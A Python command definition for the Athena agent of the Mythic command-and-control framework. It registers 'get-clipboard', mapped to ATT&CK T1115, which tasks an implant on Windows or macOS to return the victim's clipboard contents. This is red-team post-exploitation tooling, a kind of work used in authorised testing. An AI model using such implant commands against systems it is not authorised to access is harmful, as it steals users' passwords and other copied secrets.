from ..athena_utils.plugin_utilities import default_completion_callback
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class GetClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

class GetClipboardCommand(CommandBase):
    cmd = "get-clipboard"
    needs_admin = False
    script_only = True
    depends_on = "clipboard"
    plugin_libraries = []
    help_cmd = "get-clipboard"
    description = (
        "Tasks Athena to return the contents of the clipboard."
    )
    version = 1
    author = "@checkymander"
    argument_class = GetClipboardArguments
    attackmapping = ["T1115"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows, SupportedOS.MacOS]
    )
    completion_functions = {
        "command_callback": default_completion_callback
    }

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        subtask = MythicRPCTaskCreateSubtaskMessage(
            taskData.Task.ID,
            CommandName="clipboard",
            Token=taskData.Task.TokenID,
            SubtaskCallbackFunction="command_callback",
            Params=json.dumps({"action": "get"})
        )
        await SendMythicRPCTaskCreateSubtask(subtask)
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        pass
